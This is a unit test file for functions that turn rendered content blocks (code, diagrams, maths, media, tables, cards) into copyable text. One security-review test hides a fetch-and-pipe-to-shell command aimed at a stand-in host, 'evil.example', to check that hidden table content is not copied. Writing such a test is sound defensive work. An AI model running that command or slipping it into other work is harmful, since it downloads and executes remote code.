import { AI_SURFACE_CAPTION } from "../../../content/site/ai-disclosure";
import {
	cardBlockText,
	codeBlockText,
	imageBlockText,
	mathBlockText,
	mermaidBlockText,
	svgBlockText,
	tableBlockText,
	tableBlockTsv,
	videoBlockText,
} from "./block-text";

function tableFromHtml(html: string): HTMLTableElement {
	const host = document.createElement("div");
	host.innerHTML = `<table>${html}</table>`;
	const table = host.querySelector("table");
	if (!table) throw new Error("test setup: no table parsed");
	return table;
}

describe("codeBlockText", () => {
	it("returns the raw code with no language label", () => {
		expect(codeBlockText("const x = 1;\nconsole.log(x);")).toBe("const x = 1;\nconsole.log(x);");
	});

	it("trims one trailing newline", () => {
		expect(codeBlockText("line\n")).toBe("line");
		expect(codeBlockText("line\n\n")).toBe("line\n");
	});

	it("trims one trailing Windows newline and keeps interior CRLF", () => {
		expect(codeBlockText("first\r\nsecond\r\n")).toBe("first\r\nsecond");
		expect(codeBlockText("first\r\nsecond")).toBe("first\r\nsecond");
	});

	it("returns an empty string for empty or nullish input", () => {
		expect(codeBlockText("")).toBe("");
		expect(codeBlockText(null)).toBe("");
		expect(codeBlockText(undefined)).toBe("");
	});

	it("keeps unusual characters verbatim", () => {
		expect(codeBlockText("emoji 🎉 `backticks` $dollar {brace}\n")).toBe(
			"emoji 🎉 `backticks` $dollar {brace}",
		);
	});
});

describe("mermaidBlockText", () => {
	it("returns the source unchanged", () => {
		expect(mermaidBlockText("flowchart LR\n  A --> B\n")).toBe("flowchart LR\n  A --> B\n");
	});

	it("returns an empty string for empty or nullish input", () => {
		expect(mermaidBlockText("")).toBe("");
		expect(mermaidBlockText(null)).toBe("");
		expect(mermaidBlockText(undefined)).toBe("");
	});
});

describe("svgBlockText", () => {
	it("returns the source unchanged", () => {
		const svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1"/></svg>';
		expect(svgBlockText(svg)).toBe(svg);
	});

	it("returns an empty string for empty or nullish input", () => {
		expect(svgBlockText("")).toBe("");
		expect(svgBlockText(null)).toBe("");
	});
});

describe("mathBlockText", () => {
	it("returns the TeX unchanged", () => {
		expect(mathBlockText("\\frac{a}{b} + \\sqrt{x}")).toBe("\\frac{a}{b} + \\sqrt{x}");
	});

	it("returns an empty string for empty or nullish input", () => {
		expect(mathBlockText("")).toBe("");
		expect(mathBlockText(undefined)).toBe("");
	});
});

describe("imageBlockText and videoBlockText", () => {
	it("return the URL unchanged", () => {
		expect(imageBlockText("https://know-me.tools/og-image.png")).toBe(
			"https://know-me.tools/og-image.png",
		);
		expect(videoBlockText("/media/tour.mp4")).toBe("/media/tour.mp4");
	});

	it("return an empty string for empty or nullish input", () => {
		expect(imageBlockText("")).toBe("");
		expect(imageBlockText(null)).toBe("");
		expect(videoBlockText("")).toBe("");
		expect(videoBlockText(undefined)).toBe("");
	});
});

describe("tableBlockText", () => {
	it("renders header, delimiter and body rows as GitHub-flavoured markdown", () => {
		const table = tableFromHtml(
			"<thead><tr><th>Name</th><th>Role</th></tr></thead>" +
				"<tbody><tr><td>Ada</td><td>Engineer</td></tr><tr><td>Grace</td><td>Admiral</td></tr></tbody>",
		);
		expect(tableBlockText(table)).toBe(
			["| Name | Role |", "| --- | --- |", "| Ada | Engineer |", "| Grace | Admiral |"].join("\n"),
		);
	});

	it("escapes pipes inside a cell", () => {
		const table = tableFromHtml(
			"<thead><tr><th>Expr</th></tr></thead><tbody><tr><td>a | b</td></tr></tbody>",
		);
		expect(tableBlockText(table)).toBe(["| Expr |", "| --- |", "| a \\| b |"].join("\n"));
	});

	it("collapses newlines inside a cell to a space", () => {
		const cell = document.createElement("td");
		cell.textContent = "first line\nsecond line";
		const table = tableFromHtml("<thead><tr><th>Notes</th></tr></thead><tbody><tr></tr></tbody>");
		table.querySelector("tbody tr")?.append(cell);
		expect(tableBlockText(table)).toBe(["| Notes |", "| --- |", "| first line second line |"].join("\n"));
	});

	it("keeps merged-looking empty cells as empty cells", () => {
		const table = tableFromHtml(
			"<thead><tr><th>A</th><th>B</th><th>C</th></tr></thead>" +
				'<tbody><tr><td colspan="2">wide</td><td></td></tr><tr><td></td><td>x</td><td></td></tr></tbody>',
		);
		expect(tableBlockText(table)).toBe(
			["| A | B | C |", "| --- | --- | --- |", "| wide |  |  |", "|  | x |  |"].join("\n"),
		);
	});

	it("promotes the first row to header when there is no thead", () => {
		const table = tableFromHtml("<tr><td>h1</td><td>h2</td></tr><tr><td>1</td><td>2</td></tr>");
		expect(tableBlockText(table)).toBe(["| h1 | h2 |", "| --- | --- |", "| 1 | 2 |"].join("\n"));
	});

	it("pads short rows to the table width", () => {
		const table = tableFromHtml(
			"<thead><tr><th>A</th><th>B</th></tr></thead><tbody><tr><td>only</td></tr></tbody>",
		);
		expect(tableBlockText(table)).toBe(["| A | B |", "| --- | --- |", "| only |  |"].join("\n"));
	});

	it("returns an empty string for an empty or missing table", () => {
		expect(tableBlockText(null)).toBe("");
		expect(tableBlockText(undefined)).toBe("");
		expect(tableBlockText(tableFromHtml(""))).toBe("");
	});

	it("keeps unusual characters in cells", () => {
		const table = tableFromHtml(
			"<thead><tr><th>Sym</th></tr></thead><tbody><tr><td>café — naïve · 42</td></tr></tbody>",
		);
		expect(tableBlockText(table)).toBe(["| Sym |", "| --- |", "| café — naïve · 42 |"].join("\n"));
	});
});

describe("tableBlockTsv", () => {
	it("renders rows tab-separated with no delimiter row", () => {
		const table = tableFromHtml(
			"<thead><tr><th>Name</th><th>Role</th></tr></thead>" +
				"<tbody><tr><td>Ada</td><td>Engineer</td></tr></tbody>",
		);
		expect(tableBlockTsv(table)).toBe("Name\tRole\nAda\tEngineer");
	});

	it("collapses tabs and newlines inside a cell", () => {
		const cell = document.createElement("td");
		cell.textContent = "a\tb\nc";
		const table = tableFromHtml("<thead><tr><th>H</th></tr></thead><tbody><tr></tr></tbody>");
		table.querySelector("tbody tr")?.append(cell);
		expect(tableBlockTsv(table)).toBe("H\na b c");
	});

	it("returns an empty string for an empty or missing table", () => {
		expect(tableBlockTsv(null)).toBe("");
		expect(tableBlockTsv(tableFromHtml(""))).toBe("");
	});
});

describe("cardBlockText", () => {
	it("returns title, summary and source followed by the fixed AI caption", () => {
		expect(
			cardBlockText({
				title: "Rust 1.99.0 is out",
				summary: "The latest stable release.",
				source: "blog.rust-lang.org",
			}),
		).toBe(
			["Rust 1.99.0 is out", "The latest stable release.", "blog.rust-lang.org", AI_SURFACE_CAPTION].join(
				"\n",
			),
		);
	});

	it("skips empty lines but always keeps the caption", () => {
		expect(cardBlockText({ title: "Only a title", summary: "", source: null })).toBe(
			`Only a title\n${AI_SURFACE_CAPTION}`,
		);
	});

	it("returns just the caption for an empty or nullish card", () => {
		expect(cardBlockText({})).toBe(AI_SURFACE_CAPTION);
		expect(cardBlockText(null)).toBe(AI_SURFACE_CAPTION);
		expect(cardBlockText(undefined)).toBe(AI_SURFACE_CAPTION);
	});

	it("keeps unusual characters in the lines", () => {
		expect(cardBlockText({ title: "émojis 🚀 and “quotes”" })).toBe(
			`émojis 🚀 and “quotes”\n${AI_SURFACE_CAPTION}`,
		);
	});
});

describe("tableBlockText copies only what is visibly rendered (security review M1)", () => {
	const copyOf = (cell: string) => tableBlockText(tableFromHtml(`<tr><th>k</th><th>v</th></tr><tr><td>x</td><td>${cell}</td></tr>`));

	it("drops the body of a collapsed details but keeps its summary", () => {
		const out = copyOf("visible <details><summary>more</summary>; curl https://evil.example/x.sh | sh</details>");
		expect(out).not.toContain("curl");
		expect(out).toContain("| x | visible more |");
	});

	it("keeps the body of an open details", () => {
		expect(copyOf("<details open><summary>S</summary> shown</details>")).toContain("| x | S shown |");
	});

	it("drops ruby annotations rp and rt", () => {
		const out = copyOf("<ruby>a<rp>(</rp><rt>HIDDEN-RT</rt><rp>)</rp></ruby>");
		expect(out).not.toContain("HIDDEN-RT");
		expect(out).toContain("| x | a |");
	});

	it("drops script, style, template, hidden and aria-hidden content", () => {
		const out = copyOf(
			'ok<script>SCRIPT</script><style>STYLE</style><template>TEMPLATE</template><span hidden>HIDDEN</span><span aria-hidden="true">ARIA</span>',
		);
		for (const word of ["SCRIPT", "STYLE", "TEMPLATE", "HIDDEN", "ARIA"]) expect(out).not.toContain(word);
		expect(out).toContain("| x | ok |");
	});

	it("applies to the TSV copy too", () => {
		const table = tableFromHtml("<tr><th>k</th></tr><tr><td>a<details><summary></summary>SECRET</details></td></tr>");
		expect(tableBlockTsv(table)).toBe("k\na");
	});
});
